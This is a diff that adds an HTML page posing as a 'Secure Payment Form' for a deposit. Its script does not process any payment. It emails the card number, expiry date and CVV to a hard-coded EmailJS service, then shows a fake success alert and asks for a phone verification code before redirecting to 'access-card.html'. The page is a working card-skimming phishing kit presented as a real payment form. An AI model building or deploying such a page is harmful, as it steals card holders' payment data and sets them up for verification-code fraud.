@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Secure Payment Form</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("wkI_zzv-LS-eRPwAA"); // Replace with your EmailJS public key
+    })();
+  </script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      display: flex;
+      height: 100vh;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .form-container {
+      background: white;
+      padding: 2em;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 300px;
+    }
+
+    form input {
+      display: block;
+      width: 100%;
+      margin-bottom: 1em;
+      padding: 0.8em;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    button {
+      padding: 0.8em 1.5em;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 100%;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 1em;
+    }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <form id="payment-form">
+      <h2>Deposit Payment</h2>
+      <input type="text" name="card_number" placeholder="Card Number" minlength="16" required pattern="\d{16-19}"/>
+      <input type="text" name="expiry" placeholder="MM/YY" required pattern="\d{2}/\d{2}"/>
+      <input type="text" name="cvv" placeholder="CVV" maxlength="4" required pattern="\d{3,4}"/>
+      <input type="number" name="amount" placeholder="amount($)" min="1"/>
+
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById("payment-form").addEventListener("submit", function(event) {
+      event.preventDefault();
+
+      emailjs.sendForm("service_xuw4eys", "template_c0462aw", this)
+        .then(function() {
+          alert("Payment request sent successfully!");
+          alert("Enter verification code sent to your phone to complete!");
+
+          window.location.href = "access-card.html"; // redirect to thank-you page
+        }, function(error) {
+          console.log("FAILED...", error);
+          alert("Failed to send. Please try again.");
+        });
+    });
+  </script>
+</body>
+</html>
